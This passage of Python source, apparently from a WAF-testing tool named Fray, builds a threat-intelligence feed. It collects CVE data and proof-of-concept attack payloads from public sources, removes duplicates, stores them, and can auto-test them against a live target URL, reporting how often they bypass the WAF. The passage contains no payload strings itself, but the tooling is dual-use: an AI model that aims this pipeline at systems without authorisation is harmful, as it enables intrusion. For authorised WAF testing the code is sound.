    headers = {"Accept": "application/vnd.github+json"}
    if token:
        headers["Authorization"] = f"token {token}"

    since = (datetime.now(timezone.utc) - timedelta(days=since_days)).strftime("%Y-%m-%dT%H:%M:%SZ")
    url = (f"https://api.github.com/repos/projectdiscovery/nuclei-templates"
           f"/commits?since={since}&per_page=30")

    if verbose:
        print(f"    {_C.DIM}Nuclei Templates: checking recent commits...{_C.E}")

    data = _http_get_json(url, headers=headers, timeout=20)
    if not isinstance(data, list):
        if verbose:
            print(f"    {_C.Y}Nuclei Templates: skipped (rate limit or error){_C.E}")
        return []

    if verbose:
        print(f"    {_C.DIM}Nuclei Templates: {len(data)} recent commits{_C.E}")

    results = []
    cve_pattern = re.compile(r'CVE-\d{4}-\d{4,}', re.IGNORECASE)

    for commit in data[:20]:
        msg = commit.get("commit", {}).get("message", "")
        cves = cve_pattern.findall(msg)
        for cve_id in cves:
            cat = classify_category(msg)
            if cat == "other":
                cat = "xss"  # Default for Nuclei templates
            results.append(ThreatPayload(
                payload=f"# Nuclei template: {cve_id}",
                category=cat,
                subcategory="nuclei_template",
                description=f"Nuclei: {msg[:120]}",
                cve=cve_id.upper(),
                source="Nuclei Templates (projectdiscovery)",
                reference=commit.get("html_url", ""),
                tags=["nuclei", "threat-intel"],
            ))

    return results


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN ORCHESTRATOR
# ══════════════════════════════════════════════════════════════════════════════

# Source registry
_SOURCES = {
    "nvd":    {"fn": fetch_nvd,                "label": "NVD / CVE API"},
    "cisa":   {"fn": fetch_cisa_kev,           "label": "CISA KEV"},
    "github": {"fn": fetch_github_advisories,  "label": "GitHub Advisories"},
    "exploitdb": {"fn": fetch_exploitdb,       "label": "ExploitDB"},
    "rss":    {"fn": fetch_rss_feeds,          "label": "Security RSS"},
    "nuclei": {"fn": fetch_nuclei_templates,   "label": "Nuclei Templates"},
}


def run_feed(*, sources: Optional[List[str]] = None,
             since_days: int = 7,
             category_filter: str = "",
             auto_add: bool = False,
             dry_run: bool = False,
             enrich_poc: bool = True,
             test_target: str = "",
             test_delay: float = 0.3,
             test_timeout: int = 8,
             test_verify_ssl: bool = True,
             verbose: bool = True) -> Tuple[List[ThreatPayload], FeedStats]:
    """Run the threat intelligence feed pipeline.

    Args:
        sources: list of source keys (default: all)
        since_days: how far back to look
        category_filter: only this Fray category
        auto_add: automatically add to payload database
        dry_run: show what would be added without writing
        enrich_poc: scrape GitHub/PacketStorm for real PoC payloads (default: True)
        test_target: if set, auto-test new payloads against this URL
        test_delay: delay between test requests
        test_timeout: request timeout for tests
        test_verify_ssl: verify SSL during tests
        verbose: print progress

    Returns:
        (payloads, stats)
    """
    stats = FeedStats()
    cache = _load_cache()
    seen_cves = set(cache.get("seen_cves", []))
    seen_hashes = set(cache.get("seen_hashes", []))

    if verbose:
        print(f"\n  {_C.B}Fray Threat Intelligence Feed{_C.E}")
        print(f"  {_C.DIM}Looking back: {since_days} days | "
              f"Category: {category_filter or 'all'}{_C.E}")

    # Select sources
    active_sources = sources or list(_SOURCES.keys())
    all_payloads: List[ThreatPayload] = []

    for src_key in active_sources:
        src = _SOURCES.get(src_key)
        if not src:
            if verbose:
                print(f"\n  {_C.Y}Unknown source: {src_key}{_C.E}")
            continue

        if verbose:
            print(f"\n  {_C.BL}[{src['label']}]{_C.E}")

        stats.sources_queried += 1
        try:
            fn = src["fn"]
            # Build kwargs based on function signature
            kwargs = {"verbose": verbose}
            if "since_days" in fn.__code__.co_varnames:
                kwargs["since_days"] = since_days
            if "category_filter" in fn.__code__.co_varnames:
                kwargs["category_filter"] = category_filter
            if "enrich_poc" in fn.__code__.co_varnames:
                kwargs["enrich_poc"] = enrich_poc
            payloads = fn(**kwargs)
            stats.items_fetched += len(payloads)
            all_payloads.extend(payloads)
        except Exception as e:
            err = f"{src['label']}: {e}"
            stats.errors.append(err)
            if verbose:
                print(f"    {_C.R}Error: {e}{_C.E}")

    if verbose:
        print(f"\n  {_C.BL}Deduplicating...{_C.E}")

    # Deduplicate against cache + existing payloads
    existing_hashes = _load_existing_payload_hashes()
    new_payloads = []
    for p in all_payloads:
        h = p.hash
        # Skip if we've seen this payload before
        if h in seen_hashes or h in existing_hashes:
            stats.payloads_duplicate += 1
            continue
        # Skip if we've processed this CVE before (but keep non-CVE payloads)
        if p.cve and p.cve in seen_cves:
            stats.payloads_duplicate += 1
            continue
        seen_hashes.add(h)
        if p.cve:
            seen_cves.add(p.cve)
        new_payloads.append(p)
        stats.payloads_new += 1

    stats.payloads_extracted = len(all_payloads)

    if verbose:
        print(f"    Total fetched:    {stats.items_fetched}")
        print(f"    After dedup:      {_C.B}{len(new_payloads)}{_C.E} new payloads")
        print(f"    Skipped (dupes):  {stats.payloads_duplicate}")

    # Stage or auto-add
    if new_payloads and not dry_run:
        if auto_add:
            added = _add_to_database(new_payloads, verbose)
            stats.payloads_added = added
        else:
            _stage_payloads(new_payloads, verbose)

    # Update cache
    cache["seen_cves"] = list(seen_cves)
    cache["seen_hashes"] = list(seen_hashes)
    cache["last_fetch"][",".join(active_sources)] = (
        datetime.now(timezone.utc).isoformat()
    )
    cache["stats"]["total_fetched"] += stats.items_fetched
    cache["stats"]["total_added"] += stats.payloads_added
    cache["stats"]["total_skipped"] += stats.payloads_duplicate
    _save_cache(cache)

    # Summary
    if verbose:
        print(f"\n  {_C.B}Feed Summary{_C.E}")
        print(f"    Sources:    {stats.sources_queried}")
        print(f"    Fetched:    {stats.items_fetched}")
        print(f"    New:        {_C.G}{stats.payloads_new}{_C.E}")
        print(f"    Duplicate:  {stats.payloads_duplicate}")
        if stats.payloads_added:
            print(f"    Added:      {_C.G}{stats.payloads_added} to payload database{_C.E}")
        elif new_payloads and not dry_run and not auto_add:
            print(f"    Staged:     {_C.CY}{len(new_payloads)} in ~/.fray/staged_payloads/{_C.E}")
            print(f"    {_C.DIM}Run 'fray feed --auto-add' or review staged payloads{_C.E}")
        if dry_run:
            print(f"    {_C.Y}(dry-run mode — no files written){_C.E}")
        if stats.errors:
            print(f"    Errors:     {_C.R}{len(stats.errors)}{_C.E}")
            for e in stats.errors:
                print(f"      {_C.R}• {e}{_C.E}")

    # Auto-test new payloads against target
    if new_payloads and test_target and not dry_run:
        test_stats = _test_new_payloads(
            payloads=new_payloads,
            target=test_target,
            delay=test_delay,
            timeout=test_timeout,
            verify_ssl=test_verify_ssl,
            verbose=verbose,
        )
        stats.payloads_tested = test_stats["tested"]
        stats.payloads_bypassed = test_stats["bypassed"]
        stats.payloads_blocked = test_stats["blocked"]
        stats.test_target = test_target

        # Update the threat_intel.json files with test results
        if test_stats["results"]:
            _update_test_results(test_stats["results"], verbose)

    if verbose and stats.payloads_tested > 0:
        bypass_pct = (stats.payloads_bypassed / stats.payloads_tested * 100
                      if stats.payloads_tested else 0)
        print(f"\n  {_C.B}Auto-Test Results{_C.E}")
        print(f"    Target:     {stats.test_target}")
        print(f"    Tested:     {stats.payloads_tested}")
        if stats.payloads_bypassed:
            print(f"    Bypassed:   {_C.G}{stats.payloads_bypassed}{_C.E}")
        print(f"    Blocked:    {stats.payloads_blocked}")
        print(f"    Bypass rate: {_C.B}{bypass_pct:.1f}%{_C.E}")

    return new_payloads, stats


# ── Auto-test engine ─────────────────────────────────────────────────────────

def _test_new_payloads(*, payloads: List[ThreatPayload], target: str,
                        delay: float = 0.3, timeout: int = 8,
                        verify_ssl: bool = True,
                        verbose: bool = True) -> Dict:
    """Test newly discovered payloads against a live target."""
    from fray.tester import WAFTester

    if verbose:
        print(f"\n  {_C.BL}Auto-Testing {len(payloads)} new payloads against {target}{_C.E}")

    tester = WAFTester(
        target=target,
        timeout=timeout,
        delay=delay,
        verify_ssl=verify_ssl,
    )

    results = []
    tested = 0
    bypassed = 0
    blocked = 0

    for i, p in enumerate(payloads):
        # Skip comment/reference-only payloads
        if p.payload.startswith("#") or len(p.payload) < 5:
            continue

        tested += 1
        if verbose:
            short = p.payload[:50].replace("\n", "\\n")
            print(f"    [{tested}] ", end="", flush=True)

        try:
            result = tester.test_payload(p.payload, param="input")
            is_blocked = result.get("blocked", True)

            if is_blocked:
                blocked += 1
                if verbose:
                    print(f"{_C.R}BLOCKED{_C.E} {short}")
            else:
                bypassed += 1
                if verbose:
                    print(f"{_C.G}BYPASS{_C.E}  {short}")

            results.append({
                "payload_hash": p.hash,
                "category": p.category,
                "cve": p.cve,
                "blocked": is_blocked,
                "status_code": result.get("status_code", 0),
                "payload": p.payload[:200],
            })
        except Exception as e:
            if verbose:
                print(f"{_C.Y}ERROR{_C.E}   {short} ({e})")
            results.append({
                "payload_hash": p.hash,
                "category": p.category,
                "cve": p.cve,
                "blocked": True,
                "error": str(e),
                "payload": p.payload[:200],
            })
            blocked += 1

    if verbose:
        print(f"    {_C.DIM}Tested {tested} payloads{_C.E}")

    return {
        "tested": tested,
        "bypassed": bypassed,
        "blocked": blocked,
        "results": results,
    }


def _update_test_results(results: List[Dict], verbose: bool) -> None:
    """Update threat_intel.json files with test results (blocked/success_rate)."""
    payloads_root = Path(__file__).parent.parent / "payloads"
    if not payloads_root.exists():
        payloads_root = PAYLOADS_DIR

    # Build lookup: hash → result
    result_map = {r["payload_hash"]: r for r in results}

    for json_file in payloads_root.rglob("threat_intel.json"):
        try:
            data = json.loads(json_file.read_text(encoding="utf-8"))
            modified = False
            for entry in data.get("payloads", []):
                ps = entry.get("payload", "")
                if not ps:
                    continue
                h = hashlib.sha256(ps.encode("utf-8", "replace")).hexdigest()[:16]
                if h in result_map:
                    r = result_map[h]
                    entry["blocked"] = r["blocked"]
                    entry["tested_against"] = entry.get("tested_against", [])
                    entry["success_rate"] = 0.0 if r["blocked"] else 1.0
                    modified = True
            if modified:
                json_file.write_text(
                    json.dumps(data, indent=2, ensure_ascii=False),
                    encoding="utf-8")
        except (json.JSONDecodeError, OSError):
            continue


# ── Database integration ──────────────────────────────────────────────────────

def _load_existing_payload_hashes() -> Set[str]:
    """Load hashes of all existing payloads to prevent duplicates."""
    hashes = set()
    payloads_root = Path(__file__).parent.parent / "payloads"
    if not payloads_root.exists():
        payloads_root = PAYLOADS_DIR
    if not payloads_root.exists():
        return hashes

    for json_file in payloads_root.rglob("*.json"):
        try:
            data = json.loads(json_file.read_text(encoding="utf-8"))
            for p in data.get("payloads", []):
                payload_str = p.get("payload", "")
                if payload_str:
                    h = hashlib.sha256(payload_str.encode("utf-8", "replace")).hexdigest()[:16]
                    hashes.add(h)
        except (json.JSONDecodeError, OSError):
            continue

    return hashes


def _stage_payloads(payloads: List[ThreatPayload], verbose: bool) -> None:
    """Stage payloads for review before adding to database."""
    _STAGING_DIR.mkdir(parents=True, exist_ok=True)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

    # Group by category
    by_cat: Dict[str, List[ThreatPayload]] = {}
    for p in payloads:
        by_cat.setdefault(p.category, []).append(p)

    for cat, cat_payloads in by_cat.items():
        filename = f"staged_{cat}_{timestamp}.json"
        filepath = _STAGING_DIR / filename
        data = {
            "category": cat,
            "subcategory": f"threat_intel_{cat}",
            "description": f"Auto-discovered payloads from threat intelligence ({len(cat_payloads)} payloads)",
            "source": "fray threat-intel feed",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "count": len(cat_payloads),
            "payloads": [p.to_fray_format(i) for i, p in enumerate(cat_payloads)],
        }
        filepath.write_text(json.dumps(data, indent=2, ensure_ascii=False),
                            encoding="utf-8")
        if verbose:
            print(f"    {_C.G}Staged{_C.E} {len(cat_payloads)} {cat} payloads → {filepath.name}")


def _add_to_database(payloads: List[ThreatPayload], verbose: bool) -> int:
    """Add payloads directly to the Fray payload database."""
    payloads_root = Path(__file__).parent.parent / "payloads"
    if not payloads_root.exists():
        payloads_root = PAYLOADS_DIR
    if not payloads_root.exists():
        if verbose:
            print(f"    {_C.R}Payload directory not found{_C.E}")
        return 0

    # Group by category
    by_cat: Dict[str, List[ThreatPayload]] = {}
    for p in payloads:
        by_cat.setdefault(p.category, []).append(p)

    total_added = 0
    for cat, cat_payloads in by_cat.items():
        target_file = payloads_root / cat / "threat_intel.json"
        target_file.parent.mkdir(parents=True, exist_ok=True)

        # Load existing or create new
        if target_file.exists():
            try:
                existing = json.loads(target_file.read_text(encoding="utf-8"))
            except (json.JSONDecodeError, OSError):
                existing = {"category": cat, "payloads": []}
        else:
            existing = {
                "category": cat,
                "subcategory": f"threat_intel_{cat}",
                "description": f"Auto-discovered payloads from threat intelligence feeds",
                "source": "fray threat-intel feed",
                "count": 0,
                "payloads": [],
            }

        # Deduplicate against existing entries
        existing_set = set()
        for ep in existing.get("payloads", []):
            ps = ep.get("payload", "")
            if ps:
                existing_set.add(hashlib.sha256(
                    ps.encode("utf-8", "replace")).hexdigest()[:16])

        new_entries = []
        start_idx = len(existing.get("payloads", []))
        for i, p in enumerate(cat_payloads):
            if p.hash not in existing_set:
                new_entries.append(p.to_fray_format(start_idx + i))
                existing_set.add(p.hash)

        if new_entries:
            existing.setdefault("payloads", []).extend(new_entries)
            existing["count"] = len(existing["payloads"])
            existing["last_updated"] = datetime.now(timezone.utc).isoformat()
            target_file.write_text(
                json.dumps(existing, indent=2, ensure_ascii=False),
                encoding="utf-8")
            total_added += len(new_entries)
            if verbose:
                print(f"    {_C.G}Added{_C.E} {len(new_entries)} payloads → {cat}/threat_intel.json")

    return total_added
